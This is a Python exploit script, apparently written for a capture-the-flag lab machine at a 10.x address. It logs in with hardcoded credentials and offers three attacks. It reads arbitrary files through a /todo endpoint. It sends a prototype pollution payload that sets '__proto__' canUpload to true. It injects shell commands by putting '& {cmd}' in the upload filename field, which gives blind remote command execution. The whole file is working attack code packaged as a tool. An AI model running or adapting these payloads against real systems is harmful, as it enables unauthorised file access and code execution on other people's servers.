import argparse
import json
import requests as r
import sys

parser = argparse.ArgumentParser()
url = 'http://10.10.10.235:31337'


def read_file(file):
    data = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": f"{file}"}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.post(f'{url}/todo', data=jsonify, headers=headers)
    cleaned = rspn.text.replace('\\n', '\n').replace('\\', '')
    return cleaned


def send_proto():
    data = {"auth": {"name": "felamos", "password": "Winter2021"},
            "message": {"text": "Prototype_Pollution", "__proto__": {"canUpload": True}}}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.put(url, data=jsonify, headers=headers)
    return rspn.text


def exec_cmd(cmd):
    data = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": f"& {cmd}"}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.post(f'{url}/upload', data=jsonify, headers=headers)
    return rspn.text


parser.add_argument('-r', '--read-file', help="<filename> Read file, Only application files")
parser.add_argument('-U', action='store_true', help="Enable file Upload")
parser.add_argument("-c", '--command', help="Send blind System Command")
args = parser.parse_args()

if __name__ == "__main__":
    try:
        if args.read_file:
            print(read_file(args.read_file))
        elif args.U:
            print(send_proto())
        elif args.command:
            print(exec_cmd(args.command))
        else:
            print(f"[-] Try python {sys.argv[0]} -h")
    except KeyboardInterrupt:
        print('User has exited the program')
